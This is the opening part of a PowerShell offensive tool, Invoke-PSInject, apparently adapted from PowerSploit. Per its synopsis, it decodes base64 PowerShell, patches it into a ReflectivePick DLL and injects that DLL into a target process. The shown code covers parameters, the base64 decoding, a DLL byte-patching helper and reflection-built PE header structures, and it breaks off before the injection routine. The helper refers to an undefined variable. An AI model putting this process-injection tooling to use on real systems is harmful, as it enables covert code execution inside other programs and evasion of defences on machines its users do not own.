function Invoke-PSInject
{
 <#
.SYNOPSIS
Taskes a PowerShell script block (base64-encoded), patches
the decoded logic into the architecture appropriate ReflectivePick
.dll, and injects the result into a specified ProcessID.

Adapted from PowerSploit's Invoke-RefleciveDLLInjection codebase

.PARAMETER ProcId
Process to inject ReflectivePick into

.PARAMETER PoshCode
Base64-encoded PowerShell code to inject.
#>


[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void', 'Other' )]
    [String]
    $FuncReturnType = 'Other',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,
    
    [Parameter(Position = 6, Mandatory = $true)]
    [ValidateLength(1,3000)]
    [String]
    $PoshCode,

    [Parameter(Position = 7)]
    [Switch]
    $ForceASLR
)

    Set-StrictMode -Version 2

    # decode the base64 script block
    $PoshCode = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($PoshCode));

    function Invoke-PatchDll {
        <#
        .SYNOPSIS
        Patches a string in a binary byte array.

        .PARAMETER DllBytes
        Binary blog to patch.

        .PARAMETER FindString
        String to search for to replace.

        .PARAMETER ReplaceString
        String to replace FindString with
        #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [string]
            $FindString,

            [Parameter(Mandatory = $True)]
            [string]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($ReplaceString)

        $index = 0
        $s = [System.Text.Encoding]::UNICODE.GetString($DllBytes)
        $index = $s.IndexOf($FindString) * 2
        Write-Verbose "patch index: $index"

        if($index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$index+$i]=$ReplaceStringBytes[$i]
        }

        # null terminate the replaced string
        $DllBytes[$index+$ReplaceStringBytes.Length] = [byte]0x00
        $DllBytes[$index+$ReplaceStringBytes.Length+1] = [byte]0x00

        $replacestart = $index
        $replaceend = $index + $ReplaceStringBytes.Length
        write-verbose "replacestart: $replacestart"
        write-verbose "replaceend: $replaceend"

        $NewCode=[System.Text.Encoding]::Unicode.GetString($RawBytes[$replacestart..$replaceend])
        write-verbose "Replaced pattern with: $NewCode"
        
        return $DllBytes
    }


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR,
        
        [Parameter(Position = 5, Mandatory = $true)]
        [String]
        $PoshCode
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
